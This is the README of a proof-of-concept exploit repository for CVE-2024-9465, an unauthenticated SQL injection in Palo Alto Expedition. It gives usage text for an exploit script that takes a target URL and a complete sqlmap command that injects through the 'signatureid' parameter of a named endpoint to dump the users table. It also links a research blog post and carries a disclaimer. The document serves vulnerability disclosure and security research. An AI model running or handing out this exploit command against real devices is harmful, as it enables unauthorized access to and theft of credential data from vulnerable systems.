# CVE-2024-9465: Palo Alto Expedition Unauthenticated SQL Injection
Proof of concept to exploit CVE-2024-9465 on vulnerable devices.

## Blog Post
Root cause and indicators of compromise here:
[https://www.horizon3.ai/attack-research/palo-alto-expedition-from-n-day-to-full-compromise/](https://www.horizon3.ai/attack-research/palo-alto-expedition-from-n-day-to-full-compromise/)

## Usage
```
% python3 CVE-2024-9465.py -h
usage: CVE-2024-9465.py [-h] -u URL

options:
  -h, --help         show this help message and exit
  -u URL, --url URL  The URL of the target
```

## SQLMap Dump Table
```
python3 sqlmap.py -u "https://<ip_address>/bin/configurations/parsers/Checkpoint/CHECKPOINT.php?action=im port&type=test&project=pandbRBAC&signatureid=1" -p signatureid -T users --dump
```

## Follow the Horizon3.ai Attack Team on Twitter for the latest security research:
*  [Horizon3 Attack Team](https://twitter.com/Horizon3Attack)
*  [James Horseman](https://twitter.com/JamesHorseman2)
*  [Zach Hanley](https://twitter.com/hacks_zach)

## Disclaimer
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.

